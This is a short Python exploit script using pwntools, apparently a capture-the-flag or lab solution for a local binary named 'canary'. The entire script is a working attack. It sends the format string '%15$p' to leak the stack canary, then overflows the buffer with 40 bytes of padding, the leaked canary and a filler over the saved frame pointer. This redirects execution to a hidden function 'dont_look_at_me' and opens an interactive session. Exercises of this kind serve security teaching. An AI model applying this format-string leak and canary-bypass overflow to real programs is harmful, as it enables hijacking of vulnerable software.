from pwn import *

#context.terminal = ['gnome-terminal', '--', 'bash', '-c']
elf = context.binary = ELF('./source/canary')


r = process()

r.recvlines(1)

r.sendline('%15$p')

r.recvuntil('Thanks, ')
canary_leak = int(r.recvline().strip(), 16)
r.recvlines(2)

print(f"Canary is {hex(canary_leak)}")

canary_offset = 40

payload = flat(
    canary_offset * b'A',
    # cyclic(64),
    canary_leak,
    8*b'B', # Overwrite stored EBP
    elf.sym['dont_look_at_me']
    # elf.sym['main']
)

r.recvline()
r.sendline(payload)
r.recvline()

# print(r.clean())
r.interactive()

r.close()